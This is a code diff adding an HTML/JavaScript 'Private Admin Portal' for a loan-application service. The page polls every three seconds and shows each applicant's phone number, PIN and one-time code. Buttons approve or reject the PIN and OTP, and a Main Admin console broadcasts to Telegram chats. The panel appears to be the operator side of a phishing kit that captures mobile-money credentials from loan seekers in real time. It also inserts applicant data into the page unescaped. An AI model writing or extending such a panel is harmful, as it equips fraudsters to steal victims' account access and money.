@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Private Admin Portal</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-slate-900 text-white p-4 sm:p-8">
+  <div class="max-w-4xl mx-auto space-y-6">
+    
+    <!-- HEADER -->
+    <div class="flex justify-between items-center border-b border-slate-700 pb-4">
+      <div>
+        <h1 class="text-2xl font-bold text-blue-400">Private Admin Panel</h1>
+        <p class="text-sm text-slate-400">Operating Session: <span id="admin-name" class="font-bold text-white">...</span></p>
+      </div>
+      <button onclick="loadApplications()" class="bg-blue-600 hover:bg-blue-500 text-xs px-3 py-2 rounded font-semibold transition">🔄 Refresh</button>
+    </div>
+
+    <!-- MAIN ADMIN BROADCAST PANEL -->
+    <div id="broadcast-panel" class="hidden bg-slate-800 border border-purple-500/50 p-4 rounded-xl space-y-3">
+      <h2 class="text-sm font-bold text-purple-400 uppercase tracking-wide flex items-center gap-2">
+        📢 Main Admin Broadcast Console
+      </h2>
+      <p class="text-xs text-slate-400">Send an urgent broadcast message directly to all active admin Telegram chats.</p>
+      <div class="flex gap-2">
+        <input id="broadcast-msg" type="text" placeholder="Type message to broadcast..." class="flex-1 bg-slate-900 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-purple-500" />
+        <button onclick="sendBroadcast()" class="bg-purple-600 hover:bg-purple-500 text-xs font-bold px-4 py-2 rounded-lg transition">Send Broadcast</button>
+      </div>
+      <p id="broadcast-status" class="text-xs hidden"></p>
+    </div>
+
+    <!-- APPLICATIONS LIST -->
+    <div id="app-list" class="space-y-4">
+      <!-- Applications render here -->
+    </div>
+
+  </div>
+
+  <script>
+    const adminKey = decodeURIComponent(window.location.pathname.split('/')[2] || 'default');
+
+    async function loadApplications() {
+      try {
+        const res = await fetch(`/api/admin/${encodeURIComponent(adminKey)}/applications`);
+        const data = await res.json();
+
+        if (!data.success) {
+          alert("Unauthorized or invalid link");
+          return;
+        }
+
+        document.getElementById('admin-name').innerText = data.adminName;
+
+        // Reveal broadcast box ONLY if user is Main Admin
+        if (data.isMainAdmin) {
+          document.getElementById('broadcast-panel').classList.remove('hidden');
+        }
+
+        const container = document.getElementById('app-list');
+        container.innerHTML = '';
+
+        if (data.applications.length === 0) {
+          container.innerHTML = `<p class="text-slate-500 text-center py-8">No active applications found.</p>`;
+          return;
+        }
+
+        data.applications.forEach(app => {
+          const card = document.createElement('div');
+          card.className = "bg-slate-800 border border-slate-700 rounded-xl p-5 space-y-3";
+          card.innerHTML = `
+            <div class="flex justify-between items-start">
+              <div>
+                <span class="text-xs bg-slate-700 text-slate-300 px-2 py-1 rounded font-mono">${app.reference}</span>
+                <h3 class="text-lg font-bold text-white mt-1">${app.fullName || 'Applicant'}</h3>
+                <p class="text-xs text-slate-400">Phone: 263${app.formattedPhone} | PIN: ${app.pin || 'N/A'} | OTP: ${app.otpCode || 'N/A'}</p>
+              </div>
+              <span class="text-xs font-bold px-2.5 py-1 rounded ${getStatusBadgeClass(app.status)}">${app.status}</span>
+            </div>
+
+            <div class="flex flex-wrap gap-2 pt-2 border-t border-slate-700">
+              <button onclick="updateStatus('${app.reference}', 'PIN_APPROVED')" class="bg-emerald-600 text-xs font-bold px-3 py-1.5 rounded hover:bg-emerald-500 transition">Approve PIN</button>
+              <button onclick="updateStatus('${app.reference}', 'PIN_REJECTED')" class="bg-rose-600 text-xs font-bold px-3 py-1.5 rounded hover:bg-rose-500 transition">Reject PIN</button>
+              <button onclick="updateStatus('${app.reference}', 'OTP_APPROVED')" class="bg-emerald-600 text-xs font-bold px-3 py-1.5 rounded hover:bg-emerald-500 transition">Approve OTP</button>
+              <button onclick="updateStatus('${app.reference}', 'LOAN_APPROVED')" class="bg-blue-600 text-xs font-bold px-3 py-1.5 rounded hover:bg-blue-500 transition">🎉 Final Loan Approve</button>
+            </div>
+          `;
+          container.appendChild(card);
+        });
+      } catch (err) {
+        console.error(err);
+      }
+    }
+
+    async function sendBroadcast() {
+      const msgInput = document.getElementById('broadcast-msg');
+      const statusText = document.getElementById('broadcast-status');
+      const message = msgInput.value;
+
+      if (!message.trim()) return;
+
+      statusText.innerText = "Sending broadcast...";
+      statusText.className = "text-xs text-amber-400 block";
+
+      try {
+        const res = await fetch(`/api/admin/${encodeURIComponent(adminKey)}/broadcast`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ message })
+        });
+        const data = await res.json();
+
+        if (data.success) {
+          statusText.innerText = `✅ ${data.message}`;
+          statusText.className = "text-xs text-emerald-400 block";
+          msgInput.value = '';
+        } else {
+          statusText.innerText = `❌ ${data.error}`;
+          statusText.className = "text-xs text-rose-400 block";
+        }
+      } catch (err) {
+        statusText.innerText = "❌ Failed to send broadcast.";
+        statusText.className = "text-xs text-rose-400 block";
+      }
+    }
+
+    function getStatusBadgeClass(status) {
+      if (status.includes('APPROVED')) return 'bg-emerald-900/50 text-emerald-400 border border-emerald-700';
+      if (status.includes('REJECTED')) return 'bg-rose-900/50 text-rose-400 border border-rose-700';
+      return 'bg-amber-900/50 text-amber-400 border border-amber-700';
+    }
+
+    async function updateStatus(appReference, newStatus) {
+      await fetch(`/api/admin/${encodeURIComponent(adminKey)}/update-status`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ appReference, newStatus })
+      });
+      loadApplications();
+    }
+
+    loadApplications();
+    setInterval(loadApplications, 3000);
+  </script>
+</body>
+  </html>
+  
